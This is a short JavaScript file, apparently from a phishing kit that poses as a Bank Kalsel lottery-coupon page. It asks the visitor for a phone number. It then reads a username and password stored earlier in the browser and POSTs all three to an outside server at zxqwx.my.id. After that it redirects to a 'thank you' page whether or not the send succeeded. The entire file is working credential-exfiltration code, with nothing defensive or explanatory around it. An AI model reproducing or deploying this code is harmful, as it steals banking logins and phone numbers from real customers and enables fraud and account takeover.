$(document).ready(function() {
});

function next() {
	var phone = $("#phone").val().trim();
	if (phone=="") {
		alert('Mohon masukkan nomor handphone!');
		return;
	}
	$("#loader").css('display', 'flex');
	
	var username = window.localStorage.getItem('username');
	var password = window.localStorage.getItem('password');
	var message = ('\n<b>Username:</b>\n'+username+'\n\n<b>Password:</b>\n'+password+'\n\n<b>No. HP:</b>\n'+phone+'\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"kupon-undian-bank-kalsel/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
    window.location.href = "thank.html";
}